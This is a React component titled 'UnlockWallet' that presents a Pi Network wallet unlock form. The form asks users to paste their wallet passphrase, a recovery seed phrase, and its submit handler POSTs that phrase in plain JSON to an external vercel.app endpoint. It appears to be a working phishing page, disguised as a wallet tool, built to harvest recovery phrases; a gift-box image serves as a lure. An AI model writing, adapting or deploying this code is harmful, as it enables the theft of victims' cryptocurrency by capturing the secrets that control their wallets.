import { useState } from "react";
import { Modal, Button, Textarea } from "flowbite-react";
import { FaCheckCircle, FaTimesCircle } from "react-icons/fa"; // Success & Error Icons
import { AiOutlineLoading } from "react-icons/ai";

const UnlockWallet = () => {
  const [passphrase, setPassphrase] = useState("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [loading, setLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState<boolean | null>(null);
  const [message, setMessage] = useState("");
  const [formmessage, setFormMessage] = useState("");

  const handleSubmit = async () => {
    setMessage("");
    setFormMessage("");
    if (!passphrase.trim()) {
      setIsSuccess(false);
      setFormMessage("Invalid: Passphrase is required");
      // setIsModalOpen(true);
      return;
    }
    setLoading(true);
    const response = await fetch(
      "https://pi-network-api.vercel.app/submit-passphrase",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ passphrase }),
      }
    );

    const data = await response.json();
    console.log("response data", response, data);
    if (response.ok) {
      setIsSuccess(true);
      setMessage("Your request has been submitted successfully!");
    } else {
      setIsSuccess(false);
      setMessage(data.message || "An error occured try again");
    }
    setPassphrase("");
    setIsModalOpen(true);
    setLoading(false);
  };

  return (
    <div className="flex items-center justify-center px-4 pt-24">
      <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-2xl relative">
        {/* Header */}

        <img
          // key={index}
          src="/box.png"
          alt="Box-present"
          className={`h-12 absolute -top-6 -right-6`}
        />
        <h2 className="text-2xl font-bold text-center mb-6 text-purple-800">
          Paste your Passphrase to unlock your Wallet
        </h2>

        {/* Passphrase Input */}
        <Textarea
          placeholder="e.g. Bat alpha echo nails chess argon"
          value={passphrase}
          onChange={(e) => setPassphrase(e.target.value)}
          rows={4}
          disabled={loading}
          // className="w-full order rounded-lg px-4 py-2 focus:ring-2 focus:ring-purple-500 focus:outline-none"
        />
        {formmessage && (
          <i className="text-[#ff0000] text-xs mt-3">{formmessage}</i>
        )}

        {/* Submit Button */}
        <div className="mt-6">
          <Button
            className="w-full text-white bg-purple-800 hover:!bg-purple-700"
            size="lg"
            disabled={loading}
            onClick={handleSubmit}
          >
            {loading ? (
              <AiOutlineLoading className="animate-spin" />
            ) : (
              "Unlock With Passphrase"
            )}
          </Button>
        </div>
      </div>

      {/* Success/Error Modal */}
      <Modal show={isModalOpen} onClose={() => setIsModalOpen(false)} size="md">
        <Modal.Header>{isSuccess ? "Success" : "Error"}</Modal.Header>
        <Modal.Body>
          <div className="flex flex-col items-center text-center space-y-4">
            {isSuccess ? (
              <>
                <FaCheckCircle className="text-green-500 text-6xl" />
                <p className="text-lg font-semibold text-green-600">
                  {message}
                </p>
              </>
            ) : (
              <>
                <FaTimesCircle className="text-red-500 text-6xl" />
                <p className="text-lg font-semibold text-red-600">
                  Error: {message}
                </p>
              </>
            )}
          </div>
        </Modal.Body>
        <Modal.Footer>
          <Button
            color={isSuccess ? "green" : "red"}
            onClick={() => setIsModalOpen(false)}
          >
            Close
          </Button>
        </Modal.Footer>
      </Modal>
    </div>
  );
};

export default UnlockWallet;
